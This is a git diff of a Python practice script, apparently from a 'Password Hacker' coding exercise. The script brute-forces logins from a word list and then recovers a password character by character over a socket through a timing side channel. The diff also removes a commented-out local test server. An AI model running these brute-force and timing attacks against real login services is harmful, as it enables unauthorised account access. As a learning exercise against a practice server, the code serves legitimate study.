@@ -35,6 +35,11 @@ Example 2:
 import json
 import socket
 import sys
+import time
+import logging
+
+
+logging.basicConfig(filename=r'.\hacking\example.log', level=logging.DEBUG)
 
 letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
            'h', 'i', 'j', 'k', 'l', 'm', 'n',
@@ -50,6 +55,7 @@ letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
 with open(r'.\hacking\logins.txt', 'r') as file:
     logins_list = file.read().split()
 
+t = []
 host_name, port = sys.argv[1:]
 with socket.socket() as client_socket:
     client_socket.connect((host_name, int(port)))
@@ -67,119 +73,34 @@ with socket.socket() as client_socket:
         if response != wrong_login:
             login = word.rstrip()
             break
-    while True:
-        for l in letters:
-            json_send = json.dumps({"login": login, "password": password + l})
-            client_socket.send(json_send.encode())
-            response = client_socket.recv(1024).decode()
-            if response == exception_happened:
-                password += l
-            elif response == connection_success:
-                password += l
-                print(json.dumps({"login": login, "password": password}))
-                exit()
 
-# """
-# you might catch both exceptions like
-#
-# try:
-#     send
-#     receive
-# except (Exc1, Exc2) as e:
-#     pass
-#
-# but it is really not needed if everything is correct
-#
-# ***************************************
-#
-# I am sharing with a server that I created to test my solution - problem with the jetbrains check is that
-# it does not take too kindly to my debugging statements - I can control the server, and put
-# printf the userid / password to see what is going wrong ...hope this helps
-#
-#
-#
-#
-# import socket
-# import random
-# import json
-#
-# abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
-#
-#
-# logins_list = [
-#     'admin', 'Admin', 'admin1', 'admin2', 'admin3',
-#     'user1', 'user2', 'root', 'default', 'new_user',
-#     'some_user', 'new_admin', 'administrator',
-#     'Administrator', 'superuser', 'super', 'su', 'alex',
-#     'suser', 'rootuser', 'adminadmin', 'useruser',
-#     'superadmin', 'username', 'username1'
-# ]
-#
-#
-# def logins():
-#     for login in logins_list:
-#         yield login
-#
-# def random_login():
-#     return random.choice(list(logins()))
-#
-# def random_password():
-#     '''function - generating random password of length from 6 to 10'''
-#     return ''.join(random.choice(abc) for i in range(random.randint(6, 10)))
-#
-#
-# def server(server_login, server_password):
-#     HOST = '127.0.0.1'
-#     PORT = 9090
-#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-#         s.bind((HOST, PORT))
-#         try:
-#             s.listen(1)
-#             print("waiting for new connection")
-#             conn, addr = s.accept()
-#             print("connection established ")
-#             with conn:
-#                 while True:
-#                     data = conn.recv(1024)
-#
-#                     try:
-#                         login_ = json.loads(data.decode('utf8'))['login']
-#                         password_ = json.loads(data.decode('utf8'))['password']
-#                     except:
-#                         conn.send(json.dumps({'result': 'Bad request!'}).encode('utf8'))
-#                         continue
-#
-#                     if login_ == server_login:
-#
-#                         if server_password == password_:
-#                             conn.send(
-#                                 json.dumps({
-#                                     'result': 'Connection success!'
-#                                 }).encode('utf8'))
-#                             break
-#                         elif server_password.startswith(password_):
-#                             conn.send(
-#                                 json.dumps({
-#                                     'result': 'Exception happened during login'
-#                                 }).encode('utf8'))
-#                         else:
-#                             conn.send(
-#                                 json.dumps({
-#                                     'result': 'Wrong password!'
-#                                 }).encode('utf8'))
-#                     else:
-#                         conn.send(json.dumps({'result': 'Wrong login!'}).encode('utf8'))
-#         except:
-#             pass
-#
-#
-#
-#
-#
-# server_login = random_login()
-# print("server login is " + server_login)
-# server_password = random_password()
-# print("server password is " + server_password)
-# while True:
-#     server(server_login, server_password)
-# """
+    logging.error('login %s', login)
+    e = True
+    for i in range(30):
+        if e is False:
+            break
+        j = 0
+        for letter in letters:
+            json_send = json.dumps({"login": login, "password": password + letter})
+            client_socket.send(json_send.encode())
+            old_time = time.time()
+            response = client_socket.recv(1024).decode()
+            new_time = time.time()
+            logging.error('*' * 40)
+            logging.error('response %s', response)
+            logging.error('i %s, j %s', i, j)
+            logging.error('old_time = %f, new_time = %f, time = %f', old_time, new_time, new_time - old_time)
+            t.append(new_time - old_time)
+            if new_time - old_time > 0.09:
+                password += letter
+                logging.error('i %s, j %s', i, j)
+                logging.error('password %s, letter %s', password, letter)
+                break
+            if response == connection_success:
+                password += letter
+                logging.error('Finished "login": %s, "password": %s', login, password)
+                print(json.dumps({"login": login, "password": password}))
+                e = False
+                break
+            j += 1
+# print(t)
